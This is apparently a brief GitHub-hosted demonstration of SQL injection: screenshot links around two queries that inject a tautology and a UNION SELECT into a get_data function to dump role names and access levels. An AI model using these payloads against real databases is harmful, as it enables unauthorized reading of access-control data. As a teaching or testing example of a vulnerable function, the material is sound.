![image](https://user-images.githubusercontent.com/79399103/206894399-fea85177-6f02-4d72-82ce-5bd22a1035aa.png)
SELECT * FROM get_data('1'' OR 1=1 -- ');
![image](https://user-images.githubusercontent.com/79399103/206894426-de3dab1d-b435-4bad-8beb-b92c97917ac0.png)
SELECT * FROM get_data('name'' UNION SELECT CAST(NULL AS INTEGER), CAST(role_name AS VARCHAR), CAST(access_level AS VARCHAR) FROM role_access_level --');
![image](https://user-images.githubusercontent.com/79399103/206896089-b7db3cf3-3c4d-47aa-9ed7-7c97962e494d.png)

